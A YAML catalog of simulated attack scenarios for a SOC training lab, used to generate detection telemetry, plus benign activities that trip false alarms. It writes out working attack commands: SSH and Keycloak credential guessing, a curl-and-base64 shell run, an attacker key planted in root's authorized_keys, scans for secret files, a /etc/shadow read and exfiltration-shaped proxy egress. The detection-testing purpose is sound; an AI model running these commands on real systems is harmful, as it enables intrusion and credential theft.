# Attack scenario catalog — batch 10 (playground-v2/docs/playground-environment-v2.md §Attack-simulation surface).
#
# Each scenario is a parameterized command sequence dispatched from a source
# host container against a target host. The runner (runner.py) executes
# steps via `docker --context soc-playground exec`, captures start/end
# timestamps + exit codes + truncated stdout/stderr per step, and writes a
# run manifest to attacks/runs/<run_id>/meta.json — raw material for the
# fixture-capture pass (batch 10b).
#
# Schema (per scenario):
#   id: unique slug, also the run_id prefix + seed axis.
#   category: auth-metadata | execution | data-access | exfiltration
#   description: short prose for catalog listing.
#   source_host: default docker container to dispatch from.
#   source_user: default identity (must exist on source_host — seeded by
#                hosts/base/seed-users.py from realm.yaml + inventory.yaml).
#   target_host: host the attack aims at (shows up as hostname in telemetry).
#   default_intensity: default for the ${intensity} placeholder + repeat count.
#   cr_mode: optional change request the runner posts before the steps (none | valid | stale |
#            scope-mismatch; default none). An explicit --cr-mode wins.
#   steps: list of command steps. Each step:
#     cmd: shell command. Template placeholders substituted before exec:
#            ${host}      → target_host (same as scenario.target_host)
#            ${target}    → target_host (alias; clearer when reading)
#            ${user}      → resolved source_user
#            ${iteration} → 0-indexed repeat counter
#            ${intensity} → resolved intensity
#     source_host: per-step override of scenario default.
#     source_user: per-step override (root means no -u flag on docker exec).
#     repeat: positive integer, or the literal string "${intensity}".
#     delay_s_between: seconds to sleep between repeats (skipped after last).
#     allow_fail: if true, non-zero rc does not abort the scenario.
#
# Retargeting: `--target` moves target_host (what ${target}/${host} expand to).
# `--source` moves source_host (where the commands run). A scenario whose steps
# interpolate ${target} SSHes source→target, so those two differ; a LOCAL scenario
# (its commands act on the host they run on and never read ${target}, e.g.
# persistence-authorized-keys, living-off-the-land, sudo-escalation-burst) retargets
# on --source, and its story/alert only stay coherent when --source and --target name
# the same host (the oracle-golden generator defaults --target to --source for these).
#
# Reproducibility: runner hashes (scenario.id, seed, step_index, iteration)
# to seed a per-step PRNG — same seed + same catalog → same dispatches.
#
# Baseline activity: leave it ON unless you are capturing an ALERT FIXTURE.
#
#   - capturing a fixture (a clean alert.json to replay offline): disabling the
#     generators (V2_BASELINE_ENABLED=false + compose up -d --force-recreate
#     <hosts>) keeps synthetic benign traffic out of the capture window. This is
#     what the original note here meant, and it is still right for that job.
#   - capturing for ORACLE CALIBRATION (evaluations/oracle_golden/): leave the
#     generators running. The oracle's answer is a signed diff over baseline, so
#     with them off `+noise` cannot occur at all and `+event` is easier than
#     production — the suite would be calibrating against an environment that
#     does not exist. Case recruitment (`generate_case.py`, removed in #1120) ran with
#     baseline on for that reason.
#
# `docs/runbook.md` (attack runs deliberately leave baseline on) is the newer
# statement and the one to follow by default.

scenarios:

  - id: ssh-brute-force-canary
    category: auth-metadata
    description: >
      Compromised office workstation hammers canary-1's SSH with wrong
      passwords from a non-privileged identity — classic rule-5710
      (SSH invalid-user / auth-failure) territory. The signal is the
      burst of failed auth events on canary-1's sshd.
    source_host: office-ws-1
    source_user: dev.dana
    target_host: canary-1
    default_intensity: 8
    steps:
      - cmd: |
          for pw in hunter2 password123 letmein admin secret qwerty; do
            sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
              -o ConnectTimeout=3 -o PreferredAuthentications=password \
              -o NumberOfPasswordPrompts=1 \
              root@${target} true 2>&1 | head -1 || true
          done
        repeat: "${intensity}"
        delay_s_between: 4
        allow_fail: true

  - id: living-off-the-land
    category: execution
    description: >
      Foothold on canary-1 runs a `curl | bash` chain plus a base64-decoded
      shell payload — exercises Falco's execution-lineage rules (shell
      spawned from non-shell parent, curl-to-bash piping, decoded script
      execution).
    source_host: canary-1
    source_user: root
    target_host: canary-1
    default_intensity: 1
    # Step 1 does not execute web-1's HTML as a script; it only produces the
    # download + read-from-/tmp signal. No comments inside a `cmd`: Falco records
    # the whole script as the process command line, where the agent can read it.
    # File names and the decoded script stay mundane for the same reason.
    steps:
      - cmd: |
          curl -fsS http://web-1/ -o /tmp/install_${iteration}.sh 2>&1 || true
          bash -c "cat /tmp/install_${iteration}.sh | head -3" 2>&1 || true
        repeat: "${intensity}"
        allow_fail: true
      - cmd: |
          echo "IyEvYmluL2Jhc2gKaWQKdW5hbWUgLWEKaG9zdG5hbWUK" \
            | base64 -d > /tmp/healthcheck_${iteration}.sh
          bash /tmp/healthcheck_${iteration}.sh
        repeat: 1
        allow_fail: true

  - id: persistence-authorized-keys
    category: execution
    description: >
      Foothold on canary-1 appends an attacker SSH public key to
      /root/.ssh/authorized_keys — classic persistence via credential
      installation. Produces file-integrity (rule-550) + syscall (Falco
      write-below-etc / write-sensitive-file) signals.
    source_host: canary-1
    source_user: root
    target_host: canary-1
    default_intensity: 1
    # A real-shaped key with an ops-looking comment, as an intruder would plant
    # it; its private half was discarded at generation.
    steps:
      - cmd: |
          mkdir -p /root/.ssh && chmod 700 /root/.ssh
          echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGz2dOFLUJkSPZxK31HYtp250IM690V3Y7nnwT34/xKn deploy@build-02" \
            >> /root/.ssh/authorized_keys
          chmod 600 /root/.ssh/authorized_keys
          ls -la /root/.ssh/authorized_keys
        repeat: "${intensity}"
        delay_s_between: 2

  - id: cross-tier-ssh-probe
    category: data-access
    description: >
      Compromised office workstation attempts SSH to db-1 — office-ws has
      trust_edges_out: [] in inventory.yaml, so any auth attempt crosses a
      tier boundary that baseline traffic never crosses. The signal is
      cross-credential-anomaly regardless of whether auth succeeds.
    source_host: office-ws-1
    source_user: dev.dana
    target_host: db-1
    default_intensity: 4
    steps:
      - cmd: |
          sshpass -p changeme ssh -o StrictHostKeyChecking=no \
            -o ConnectTimeout=3 -o NumberOfPasswordPrompts=1 \
            dev.dana@${target} "id; hostname; ls /var/lib/postgresql 2>&1 | head -3" \
            2>&1 | head -5 || true
        repeat: "${intensity}"
        delay_s_between: 6
        allow_fail: true

  - id: postgres-cred-probe
    category: data-access
    description: >
      Compromised office workstation probes db-1's PostgreSQL directly — a burst
      of failed logins under guessed service accounts, then a data read with a
      weak app credential. office-ws has trust_edges_out: [] so no baseline path
      reaches the db tier, and the app's own DB traffic never fails auth; the
      signal is the `FATAL: password authentication failed` burst in
      logs-postgresql.log plus the off-tier SELECT. Reads ${target}, so it
      retargets to any postgres host.
    source_host: office-ws-1
    source_user: dev.dana
    target_host: db-1
    default_intensity: 5
    steps:
      - cmd: |
          for u in dbadmin backup pgadmin superuser reporting; do
            PGPASSWORD=Password123 psql -h ${target} -U "$u" -d postgres \
              -c 'SELECT 1' 2>&1 | head -1 || true
          done
        repeat: "${intensity}"
        delay_s_between: 5
        allow_fail: true
      - cmd: |
          PGPASSWORD=changeme psql -h ${target} -U appuser -d app \
            -c 'SELECT count(*) FROM orders;' \
            -c 'SELECT * FROM orders LIMIT 5;' 2>&1 | head -10 || true
        repeat: 1
        allow_fail: true

  - id: web-path-scan
    category: data-access
    description: >
      Compromised office workstation enumerates a web host for exposed admin
      panels, dotfiles and backups — a curl sweep of ~10 sensitive paths that all
      404. Baseline nginx traffic is health probes from 127.0.0.1 hitting two
      paths, so the distinguishing signal is a burst of distinct url.path 404s
      from an off-host source.ip in logs-nginx.access. Reads ${target}, so it
      retargets to any web host.
    source_host: office-ws-1
    source_user: dev.dana
    target_host: web-1
    default_intensity: 1
    steps:
      - cmd: |
          for path in /admin /.env /wp-login.php /api/v1/users /.git/config \
                      /phpmyadmin /server-status /config.php /backup.sql \
                      /.aws/credentials /actuator/health /.ssh/id_rsa; do
            curl -sS -m 3 -o /dev/null -w "%{http_code} ${path}\n" \
              "http://${target}${path}" 2>&1 || true
          done
        repeat: "${intensity}"
        delay_s_between: 3
        allow_fail: true

  - id: sudo-escalation-burst
    category: execution
    description: >
      Post-foothold interactive privilege probing on a single host — a burst of
      sudo invocations (successful or denied) reading sensitive files. Every
      execve of /usr/bin/sudo emits a Falco "Sudo execution" NOTICE; ≥3 on one
      host in 10 minutes trips v2-off-hours-sudo. LOCAL scenario: the commands run
      on the host itself, so it retargets on --source (source==target), not on
      --target.
    source_host: dev-ws-1
    source_user: dev.dana
    target_host: dev-ws-1
    default_intensity: 4
    steps:
      - cmd: |
          sudo -n id 2>&1 | head -1 || true
          sudo -n cat /etc/shadow 2>&1 | head -1 || true
        repeat: "${intensity}"
        delay_s_between: 20
        allow_fail: true

  - id: keycloak-cred-stuffing
    category: auth-metadata
    description: >
      Credential-stuffing against the Keycloak IdP — a burst of OIDC password
      grants under guessed usernames with a wrong password, each raising a
      LOGIN_ERROR in logs-keycloak.events. Baseline does not drive interactive IdP
      logins, so the error burst stands against a near-empty window. LOCAL scenario:
      it runs on the foothold and reaches the IdP by DNS (keycloak:8080). The IdP is
      a service, not a host role, and its events carry host.name=soc-playground, not
      a per-host identity — so the case names the ACTOR host and attributes by
      ipAddress/username in the lead. Retargets on --source (source==target), not
      --target.
    source_host: office-ws-1
    source_user: dev.dana
    target_host: office-ws-1
    default_intensity: 6
    # The loop variable is `u`, not `user`: the runner substitutes ${user} (the source
    # identity) before the shell runs, so a `user` loop would guess one account five times.
    steps:
      - cmd: |
          for u in admin sre.alice dev.dana svc.backups operator; do
            curl -sS -m 5 -o /dev/null -w "%{http_code} $u\n" \
              -d "client_id=admin-cli" -d "grant_type=password" \
              -d "username=$u" -d "password=Password123!" \
              "http://keycloak:8080/realms/soc-playground/protocol/openid-connect/token" \
              2>&1 || true
          done
        repeat: "${intensity}"
        delay_s_between: 4
        allow_fail: true

  - id: proxy-egress-burst
    category: exfiltration
    description: >
      Authenticated egress through the Squid forward proxy under a compromised
      credential — a burst of outbound GET/CONNECT to external destinations, the
      shape of staged exfiltration or tool-download over the sanctioned proxy. Every
      request lands in logs-squid.access attributed to user.name (the basic-auth
      identity) with source.ip = the originating container; the destination is
      url.original. Baseline routes no egress through the proxy, so a single
      authenticated request already stands against an empty window. Runs FROM the
      compromised host outward to a fixed service, so it retargets on --source (the
      egressing host), not --target.
    source_host: office-ws-1
    source_user: dev.dana
    target_host: office-ws-1
    default_intensity: 8
    steps:
      - cmd: |
          for url in https://example.com https://ifconfig.me https://transfer.sh \
                     https://raw.githubusercontent.com https://pastebin.com \
                     https://api.telegram.org; do
            curl -sS -m 5 -o /dev/null -w "%{http_code} ${url}\n" \
              -x "http://dev.dana:changeme@squid:3128" "${url}" 2>&1 || true
          done
        repeat: "${intensity}"
        delay_s_between: 4
        allow_fail: true

  # ── Legitimate activity that trips a rule (#1497) ─────────────────────────
  # Everything below is NOT an attack, though the capture fires it the same way. Each scenario
  # is built around where the evidence that settles its alert lives: in a system the lab tenant
  # can read, nowhere the tenant can read, or nowhere at all because the rule's logic or the data
  # it read is what fired. Ids name the activity, never the case class: a person labels every case.
  # Legitimate activity the baseline already produces (fleet scans, key rotation, a mistyped
  # password, deploys) is left to the baseline: a copy here would fire the same rule on the same
  # host and merge with it. `cr_mode:` is the change request the runner posts before the steps
  # (an explicit --cr-mode wins); the capture passes none, so this is how a captured scenario
  # gets its change record.
  # Scenarios whose case rests on there being NO record target hosts with no standing change
  # window (change-mgmt/seed/standing.yaml covers db-1 daily and web-1/web-2 on Tuesdays), so
  # firing time cannot put an approved change over them.

  # The record that settles it is reachable: a change request covering this host, user and
  # window, posted just before the work.
  - id: change-backed-web-maintenance
    category: execution
    description: >
      An SRE hops from the bastion to web-1 inside an approved change window and checks
      packages, validates and reloads nginx under sudo. Three or more sudo executions trip
      v2-off-hours-sudo; the change request names the same host, requester and window.
    source_host: jump-box-1
    source_user: sre.alice
    target_host: web-1
    default_intensity: 1
    cr_mode: valid
    steps:
      - cmd: |
          sshpass -p changeme ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
            -o ConnectTimeout=5 ${user}@${target} \
            'sudo -n apt-get -s upgrade >/dev/null; sudo -n nginx -t 2>/dev/null; sudo -n nginx -s reload; sudo -n tail -n 20 /var/log/nginx/error.log >/dev/null'
        repeat: 1
        allow_fail: true

  # The rule's logic is what fires: v2-sshd-success-after-failures joins on host only, so one
  # account's failures and another account's unrelated login read as "success after failures".
  # The failing account must exist on db-1: an unknown user's attempt also writes a PAM
  # "check pass; user unknown" line that ingest records as event.outcome=success, which fires the
  # rule on failures alone (that is dev-username-typo-bastion, below).
  - id: report-job-retries-then-sre-login-db
    category: auth-metadata
    description: >
      The reporting job on web-1 retries an SSH export to db-1 as svc.backups with a password
      that was rotated, then an SRE logs into db-1 from the bastion for unrelated work.
      Different users, different sources, but the rule groups by host:
      v2-sshd-success-after-failures fires on db-1.
    source_host: web-1
    source_user: svc.reports
    target_host: db-1
    default_intensity: 4
    steps:
      - cmd: |
          sshpass -p "backups-2026Q3" ssh -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password \
            -o NumberOfPasswordPrompts=1 -o ConnectTimeout=5 \
            svc.backups@${target} 'ls /var/backups' 2>/dev/null || true
        repeat: "${intensity}"
        delay_s_between: 15
        allow_fail: true
      - cmd: |
          sshpass -p changeme ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
            -o ConnectTimeout=5 sre.chen@${target} 'uptime && df -h /' >/dev/null
        source_host: jump-box-1
        source_user: sre.chen
        repeat: 1
        allow_fail: true

  # The rule's logic is what fires: v2-cross-tier-ssh-pivot sequences two logins with no join
  # key, so the config server's routine login to a workstation and a DBA's own login to db-1
  # read as a pivot.
  - id: fleet-check-then-dba-session
    category: data-access
    description: >
      The config-management server logs into dev-ws-1 for a routine check, and a few minutes
      later the DBA logs into db-1 from the bastion. Nothing connects the two sessions, but
      the pivot rule has no join key: a workstation login followed by a prod login within
      15 minutes fires v2-cross-tier-ssh-pivot.
    source_host: config-mgmt-1
    source_user: svc.config-mgmt
    target_host: dev-ws-1
    default_intensity: 1
    steps:
      - cmd: |
          sshpass -p changeme ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
            -o ConnectTimeout=5 ${user}@${target} 'uptime >/dev/null; dpkg -l | wc -l >/dev/null'
        repeat: 1
        allow_fail: true
      - cmd: |
          sleep 120
          sshpass -p changeme ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
            -o ConnectTimeout=5 dba.ivy@db-1 'psql --version >/dev/null; df -h /var/lib/postgresql >/dev/null'
        source_host: jump-box-1
        source_user: dba.ivy
        repeat: 1
        allow_fail: true

  # The rule's logic is what fires: v2-nginx-path-enumeration counts distinct 4xx paths from
  # one source, and cannot tell a post-deploy link checker hitting retired assets from a scan.
  - id: post-deploy-asset-check-web
    category: data-access
    description: >
      After a deploy, CI checks that last release's static assets still resolve on web-1.
      They were removed with the release, so ten distinct paths 404 from ci-1 within a
      minute and v2-nginx-path-enumeration fires.
    source_host: ci-1
    source_user: svc.deploy
    target_host: web-1
    default_intensity: 1
    steps:
      - cmd: |
          for p in /static/js/app.4f1c2e.js /static/js/vendor.91ab0d.js \
                   /static/css/main.7d3e11.css /static/css/print.2b9f40.css \
                   /assets/img/logo-2025.svg /assets/img/hero-2025.webp \
                   /assets/fonts/inter-v3.woff2 /release-notes/2026-10.html \
                   /docs/v1/index.html /favicon-2025.ico; do
            curl -sS -m 3 -o /dev/null -w "%{http_code} $p\n" "http://${target}$p" 2>&1 || true
          done
        repeat: "${intensity}"
        allow_fail: true

  # The data is what fires: an sshd attempt by an unknown user also writes a PAM
  # "check pass; user unknown" line, which ingest records as event.outcome=success. Two
  # mistyped usernames are enough for v2-sshd-success-after-failures, though nobody logged in.
  - id: dev-username-typo-bastion
    category: auth-metadata
    description: >
      A developer mistypes their username twice logging into the bastion, then gives up.
      No login succeeds, but each unknown-user attempt is also recorded as a success, so
      v2-sshd-success-after-failures fires on jump-box-1.
    source_host: dev-ws-1
    source_user: dev.hira
    target_host: jump-box-1
    default_intensity: 1
    steps:
      - cmd: |
          for u in dev.hria hira; do
            sshpass -p changeme ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
              -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1 \
              -o ConnectTimeout=5 "$u@${target}" true 2>/dev/null || true
            sleep 3
          done
        repeat: 1
        allow_fail: true

  # Legitimate, but the only record that would show it sits nowhere the tenant can read: it was
  # agreed by phone. No change request, no ticket.
  - id: sre-new-laptop-key-bastion
    category: execution
    description: >
      An SRE adds their new laptop's key to their own account on the bastion, from dev-ws-1.
      It was agreed by phone; nothing in change-mgmt or the tickets records it.
      v2-falco-authorized-keys-modification fires on jump-box-1.
    source_host: dev-ws-1
    source_user: sre.chen
    target_host: jump-box-1
    default_intensity: 1
    steps:
      - cmd: |
          k=/tmp/lt_key_$$
          ssh-keygen -q -t ed25519 -N "" -C "chen@lt-0412" -f "$k"
          sshpass -p changeme ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
            -o ConnectTimeout=5 ${user}@${target} \
            'mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys' \
            < "$k.pub"
          rm -f "$k" "$k.pub"
        repeat: 1
        allow_fail: true

  # Legitimate on-call work, but the on-call roster and the page that prompted it live off-lab.
  - id: oncall-canary-triage
    category: execution
    description: >
      The on-call SRE is paged about disk space on canary-1 and triages it from the bastion:
      disk usage, listeners and the auth log under sudo. No change request; the roster and
      the page are in systems the tenant does not have. v2-off-hours-sudo fires.
    source_host: jump-box-1
    source_user: sre.ben
    target_host: canary-1
    default_intensity: 1
    steps:
      - cmd: |
          sshpass -p changeme ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
            -o ConnectTimeout=5 ${user}@${target} \
            'sudo -n du -sh /var/log /tmp 2>/dev/null; sudo -n ss -tnlp >/dev/null; sudo -n tail -n 50 /var/log/auth.log >/dev/null; sudo -n df -h >/dev/null'
        repeat: 1
        allow_fail: true

  # Legitimate, asked for in chat by the developer whose workstation it is; that chat is the
  # only record, and it is off-lab.
  - id: sre-workstation-fix-on-request
    category: execution
    description: >
      An SRE fixes a broken package install on dev-ws-1 under sudo, asked to in chat by the
      team that owns it. No change request (dev-ws-1 has no change window; changes there are
      ad hoc) and no ticket. v2-off-hours-sudo fires.
    source_host: jump-box-1
    source_user: sre.alice
    target_host: dev-ws-1
    default_intensity: 1
    steps:
      - cmd: |
          sshpass -p changeme ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
            -o ConnectTimeout=5 ${user}@${target} \
            'sudo -n dpkg --audit; sudo -n apt-get -s -f install >/dev/null; sudo -n tail -n 30 /var/log/dpkg.log >/dev/null; sudo -n ls -la /var/cache/apt/archives/partial >/dev/null'
        repeat: 1
        allow_fail: true
